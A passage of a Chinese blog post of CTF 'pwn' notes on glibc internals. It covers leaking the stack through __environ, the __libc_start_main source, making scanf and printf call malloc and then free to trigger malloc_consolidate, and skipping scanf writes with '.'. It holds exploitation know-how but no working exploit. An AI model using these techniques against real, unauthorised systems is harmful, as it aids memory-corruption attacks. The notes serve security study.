    <entry>
      <title>pwn杂烩</title>
      <link href="/posts/25867/"/>
      <url>/posts/25867/</url>
      
        <content type="html"><![CDATA[<h1 id="GLIBC相关"><a href="#GLIBC相关" class="headerlink" title="GLIBC相关"></a>GLIBC相关</h1><h2 id="environ"><a href="#environ" class="headerlink" title="__environ"></a>__environ</h2><p>libc.so中存在一个符号<code>&#39;__environ&#39;</code></p><p>其存储的是main函数导出的envp参数的指针</p><p>因此可以通过其泄露栈地址,并以此获得栈上的各类数据地址</p><h2 id="read汇编"><a href="#read汇编" class="headerlink" title="read汇编"></a>read汇编</h2><p>在glibc中的read,write,open这些系统调用级调用函数<br>其汇编代码中都会存在syscall(0x0f05)</p><p>在无输出类题中会有妙用</p><h2 id="libc-start-main"><a href="#libc-start-main" class="headerlink" title="__libc_start_main"></a>__libc_start_main</h2><p>__libc_start_main函数</p><p>源码在glibc/csu/libc-start.c中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params"> <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params"> ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params"> __typeof (main) init,</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Result of the &#x27;main&#x27; function.  */</span></span><br><span class="line">  <span class="type">int</span> result;</span><br><span class="line"></span><br><span class="line">  __libc_multiple_libcs = &amp;_dl_starting_up &amp;&amp; !_dl_starting_up;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  _dl_relocate_static_pie ();</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Store the lowest stack address.  This is done in ld.so if this is</span></span><br><span class="line"><span class="comment">     the code for the DSO.  */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> HAVE_AUX_VECTOR</span></span><br><span class="line">  <span class="comment">/* First process the auxiliary vector since we need to find the</span></span><br><span class="line"><span class="comment">     program header to locate an eventually present PT_TLS entry.  */</span></span><br><span class="line"><span class="meta">#  <span class="keyword">ifndef</span> LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line">  ElfW(<span class="type">auxv_t</span>) *auxvec;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> **evp = ev;</span><br><span class="line">    <span class="keyword">while</span> (*evp++ != <span class="literal">NULL</span>)</span><br><span class="line">      ;</span><br><span class="line">    auxvec = (ElfW(<span class="type">auxv_t</span>) *) evp;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line">  _dl_aux_init (auxvec);</span><br><span class="line">  <span class="keyword">if</span> (GL(dl_phdr) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Starting from binutils-2.23, the linker will define the</span></span><br><span class="line"><span class="comment">         magic symbol __ehdr_start to point to our own ELF header</span></span><br><span class="line"><span class="comment">         if it is visible in a segment that also includes the phdrs.</span></span><br><span class="line"><span class="comment">         So we can set up _dl_phdr and _dl_phnum even without any</span></span><br><span class="line"><span class="comment">         information from auxv.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Ehdr)</span> __ehdr_start</span><br><span class="line">__<span class="title function_">attribute__</span> <span class="params">((weak, visibility (<span class="string">&quot;hidden&quot;</span>)))</span>;</span><br><span class="line">      <span class="keyword">if</span> (&amp;__ehdr_start != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          assert (__ehdr_start.e_phentsize == <span class="keyword">sizeof</span> *GL(dl_phdr));</span><br><span class="line">          GL(dl_phdr) = (<span class="type">const</span> <span class="type">void</span> *) &amp;__ehdr_start + __ehdr_start.e_phoff;</span><br><span class="line">          GL(dl_phnum) = __ehdr_start.e_phnum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize very early so that tunables can use it.  */</span></span><br><span class="line">  __libc_init_secure ();</span><br><span class="line"></span><br><span class="line">  __tunables_init (__environ);</span><br><span class="line"></span><br><span class="line">  ARCH_INIT_CPU_FEATURES ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Perform IREL&#123;,A&#125; relocations.  */</span></span><br><span class="line">  ARCH_SETUP_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The stack guard goes into the TCB, so initialize it early.  */</span></span><br><span class="line">  ARCH_SETUP_TLS ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In some architectures, IREL&#123;,A&#125; relocations happen after TLS setup in</span></span><br><span class="line"><span class="comment">     order to let IFUNC resolvers benefit from TCB information, e.g. powerpc&#x27;s</span></span><br><span class="line"><span class="comment">     hwcap and platform fields available in the TCB.  */</span></span><br><span class="line">  ARCH_APPLY_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DL_SYSDEP_OSCHECK</span></span><br><span class="line">  <span class="keyword">if</span> (!__libc_multiple_libcs)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* This needs to run to initiliaze _dl_osversion before TLS</span></span><br><span class="line"><span class="comment"> setup might check it.  */</span></span><br><span class="line">      DL_SYSDEP_OSCHECK (__libc_fatal);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize libpthread if linked in.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__pthread_initialize_minimal != <span class="literal">NULL</span>)</span><br><span class="line">    __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the pointer guard value.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,</span><br><span class="line"> stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_POINTER_GUARD</span></span><br><span class="line">  THREAD_SET_POINTER_GUARD (pointer_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __pointer_chk_guard_local = pointer_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !SHARED  */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the dynamic linker if there is any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Call the initializer of the libc.  This is only needed here if we</span></span><br><span class="line"><span class="comment">     are compiling for the static library in which case we haven&#x27;t</span></span><br><span class="line"><span class="comment">     run the constructors in `_dl_start_user&#x27;.  */</span></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the program, if any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fini)</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Some security at this point.  Prevent starting a SUID binary where</span></span><br><span class="line"><span class="comment">     the standard file descriptors are not opened.  We have to do this</span></span><br><span class="line"><span class="comment">     only for statically linked applications since otherwise the dynamic</span></span><br><span class="line"><span class="comment">     loader did the work already.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">    __libc_check_standard_fds ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call the initializer of the program, if any.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ninitialize program: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">if</span> (init)</span><br><span class="line">    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: we have a new object.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_naudit) &gt; <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">audit_ifaces</span> *<span class="title">afct</span> =</span> GLRO(dl_audit);</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">head</span> =</span> GL(dl_ns)[LM_ID_BASE]._ns_loaded;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> cnt = <span class="number">0</span>; cnt &lt; GLRO(dl_naudit); ++cnt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (afct-&gt;preinit != <span class="literal">NULL</span>)</span><br><span class="line">    afct-&gt;preinit (&amp;link_map_audit_state (head, cnt)-&gt;cookie);</span><br><span class="line"></span><br><span class="line">  afct = afct-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ntransferring control: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  _dl_debug_initialize (<span class="number">0</span>, LM_ID_BASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> HAVE_CLEANUP_JMP_BUF</span></span><br><span class="line">  <span class="comment">/* Memory for the cancellation buffer.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pthread_unwind_buf</span> <span class="title">unwind_buf</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> not_first_call;</span><br><span class="line">  not_first_call = setjmp ((<span class="keyword">struct</span> __jmp_buf_tag *) unwind_buf.cancel_jmp_buf);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (! not_first_call))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">pthread</span> *<span class="title">self</span> =</span> THREAD_SELF;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Store old info.  */</span></span><br><span class="line">      unwind_buf.priv.data.prev = THREAD_GETMEM (self, cleanup_jmp_buf);</span><br><span class="line">      unwind_buf.priv.data.cleanup = THREAD_GETMEM (self, cleanup);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Store the new cleanup handler info.  */</span></span><br><span class="line">      THREAD_SETMEM (self, cleanup_jmp_buf, &amp;unwind_buf);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Run the program.  */</span></span><br><span class="line">      result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Remove the thread-local data.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      PTHFCT_CALL (ptr__nptl_deallocate_tsd, ());</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">void</span> __nptl_deallocate_tsd (<span class="type">void</span>) __attribute ((weak));</span><br><span class="line">      __nptl_deallocate_tsd ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* One less thread.  Decrement the counter.  If it is zero we</span></span><br><span class="line"><span class="comment"> terminate the entire process.  */</span></span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> *ptr = __libc_pthread_functions.ptr_nthreads;</span><br><span class="line"><span class="meta">#  <span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">      PTR_DEMANGLE (ptr);</span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">unsigned</span> <span class="type">int</span> __nptl_nthreads __attribute ((weak));</span><br><span class="line">      <span class="type">unsigned</span> <span class="type">int</span> *<span class="type">const</span> ptr = &amp;__nptl_nthreads;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (! atomic_decrement_and_test (ptr))</span><br><span class="line"><span class="comment">/* Not much left to do but to exit the thread, not the process.  */</span></span><br><span class="line">__exit_thread ();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="comment">/* Nothing fancy, just call the function.  */</span></span><br><span class="line">  result = main (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span> (result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>源码挺长提几个重要的点</p><ol><li>__libc_start_main共有7个参数,不过正常利用下只需要注意前三个就行,分别是main,argc,argv</li><li>函数过程中会调用read从而在栈上留下read的libc地址,一些情况下可以利用其中的syscall</li><li>最后启动main时main的三个参数分别是argc,argv,和__environ</li></ol><p>__libc_start_main也可以启动除main以外的函数.甚至都不需要是函数只要是可执行的代码就行,不过需要另作一些布置</p><h2 id="scanf"><a href="#scanf" class="headerlink" title="scanf"></a>scanf</h2><p>在 glibc中，<code>__isoc99_scanf</code> 和 <code>scanf</code> 实际上是同一个函数的两个不同名称。<code>__isoc99_scanf</code> 是 <code>scanf</code> 函数的 ISO C99 标准兼容版本的别名。ISO C99 是 C 语言的标准之一，它引入了一些新的特性和改进，其中包括一些涉及格式化输入的变化。</p><p>scanf与 read 函数相同，可以读取 \ x00 后面的内容，仅将<strong>换行符</strong>作为输入读取的结束标志。</p><p>不过这里要注意的是，%s 参数会以空格作为分隔符，也就是说，如果输入中含有空格，那么<strong>空格前后的内容会被分配到不同的 %s 参数中</strong>。</p><p>scanf函数实际调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_vscanf (<span class="type">const</span> <span class="type">char</span> *format, va_list args)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __vfscanf_internal (<span class="built_in">stdin</span>, format, args, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__vfscanf_internal的代码挺长,不做分析</p><h3 id="scanf触发malloc探究"><a href="#scanf触发malloc探究" class="headerlink" title="scanf触发malloc探究"></a>scanf触发malloc探究</h3><p>看最终触发malloc的部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span></span><br><span class="line">__libc_scratch_buffer_grow_preserve (<span class="keyword">struct</span> scratch_buffer *buffer)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> new_length = <span class="number">2</span> * buffer-&gt;length;</span><br><span class="line">  <span class="type">void</span> *new_ptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buffer-&gt;data == buffer-&gt;__space.__c)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Move buffer to the heap.  No overflow is possible because</span></span><br><span class="line"><span class="comment"> buffer-&gt;length describes a small buffer on the stack.  */</span></span><br><span class="line">      new_ptr = <span class="built_in">malloc</span> (new_length);</span><br><span class="line">      <span class="keyword">if</span> (new_ptr == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_ptr, buffer-&gt;__space.__c, buffer-&gt;length);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Buffer was already on the heap.  Check for overflow.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_likely (new_length &gt;= buffer-&gt;length))</span><br><span class="line">new_ptr = <span class="built_in">realloc</span> (buffer-&gt;data, new_length);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  __set_errno (ENOMEM);</span><br><span class="line">  new_ptr = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (new_ptr == <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Deallocate, but buffer must remain valid to free.  */</span></span><br><span class="line">  <span class="built_in">free</span> (buffer-&gt;data);</span><br><span class="line">  scratch_buffer_init (buffer);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Install new heap-based buffer.  */</span></span><br><span class="line">  buffer-&gt;data = new_ptr;</span><br><span class="line">  buffer-&gt;length = new_length;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_scratch_buffer_grow_preserve)</span><br></pre></td></tr></table></figure><p>这里触发了<strong>malloc</strong></p><p>不过可以发现,在scanf函数执行完后,并不能找到这个chunk,</p><p>显然在后面的操作中还触发了<strong>free</strong></p><p>可以写一些demo跟进调试发现确实如此</p><p><strong>触发条件</strong></p><ol><li>scanf的格式化字符串参数应该为<strong>数字类</strong>(%d,%lld,%lf,%zu)</li><li>发送的字符应该为数字字符,即只能<strong>‘0’-‘9’</strong></li><li>发送的长度应该&gt;=1024(不含换行符)</li></ol><p><strong>细节问题:</strong></p><ol><li><strong>最终变量被写为多少</strong></li></ol><p>如果发送1024个’0’,那么scanf最终的读取大小为<strong>0</strong></p><p>但如果发送1024个大于’0’的字符则有几种情况:</p><div class="table-container"><table><thead><tr><th>%d</th><th>FFFFFFFF(-1)</th></tr></thead><tbody><tr><td>%lld</td><td>7FFFFFFFFFFFFFFF</td></tr><tr><td>%lf</td><td>inf</td></tr><tr><td>%zu</td><td>FFFFFFFFFFFFFFFF</td></tr></tbody></table></div><ol><li><strong>malloc申请多大的内存</strong></li></ol><p>malloc申请的大小为标准输入流默认缓冲区大小的两倍,一般是0x800,chunk实际大小0x810,属于largebin</p><p>会触发malloc_consolidate,如果有fastbin chunk的话会尝试合并并放入unsorted bin,经过unsorted遍历一般会放置到对应的bin</p><h4 id="类似的printf"><a href="#类似的printf" class="headerlink" title="类似的printf"></a>类似的printf</h4><p>与scanf类似printf也会触发malloc</p><p>例如<code>printf(&quot;%65535c&quot;,var);</code></p><p>其中65535差不多就是临界了,再往低可能就不触发malloc</p><p>这样就会触发申请一个很大的chunk(实际大小0x10030)</p><p>之后同样也会被free</p><p>还有说gets和puts也有这样的机制,不过我测试时并没有成功</p><h4 id="相关利用"><a href="#相关利用" class="headerlink" title="相关利用"></a>相关利用</h4><p>在低版本中可以用来触发hook函数</p><p>或者更通用的用于触发malloc_consolidate来完成一些利用</p><h3 id="hateful-dot"><a href="#hateful-dot" class="headerlink" title="hateful dot"></a>hateful dot</h3><p>scanf在读取数字时能否使其不读取改变原值直接跳过?</p><p>例如<code>scanf(&quot;%d&quot;,&amp;var);</code>,要保证var的值不改变</p><p>如果直接输入换行符,scanf因为没有发现数字,会继续等待输入,显然不行</p><p>这就需要用到scanf读取数字时的一个特性</p><p>当scanf读取数字时,可以用<code>.</code>来绕过其对变量值的写入</p><p>当读取整型时:可以用<code>.1234534565</code>或者单独<code>.</code>绕过</p><p>当读取浮点数时:只能用<code>.</code>绕过</p><p><strong>与之类似的还有<code>+</code>和<code>-</code></strong></p><p>其实scanf读数字时,<strong>所有的非数字类字符都能使得跳过该次scanf</strong></p><p>但是除了<code>+-.</code></p><p>剩下的字符在该次scanf跳过后还会保存在缓冲区中,使得接下来的scanf依然会失效,当然如果有其他io函数可以读取这个字符另作考虑</p><p>且如果scanf读取的是<code>+-.</code>以外的非数字字符,<u>那么本次scanf甚至不要求接收换行符</u></p><h2 id="exit-amp-amp-exit"><a href="#exit-amp-amp-exit" class="headerlink" title="exit&amp;&amp;_exit"></a>exit&amp;&amp;_exit</h2><p>在Linux中，<code>exit()</code>和<code>_exit()</code>函数都用于终止一个程序，但它们在终止程序时的行为有显著差异：</p><ol><li><strong><code>exit()</code> 函数：</strong><ul><li><code>exit()</code> 是标准C库函数，定义在 <code>&lt;stdlib.h&gt;</code> 中。</li><li>在调用 <code>exit()</code> 时，首先执行所有注册的退出函数（通过 <code>atexit()</code> 注册），<strong>清理I/O</strong>（如关闭所有标准I/O流，刷新缓冲区等）。</li><li>然后，<code>exit()</code> 调用底层的 <code>_exit()</code> 或 <code>_Exit()</code> 函数来结束程序。</li></ul></li><li><strong><code>_exit()</code> 函数：</strong><ul><li><code>_exit()</code> 是POSIX系统调用，定义在 <code>&lt;unistd.h&gt;</code> 中。</li><li>当调用 <code>_exit()</code> 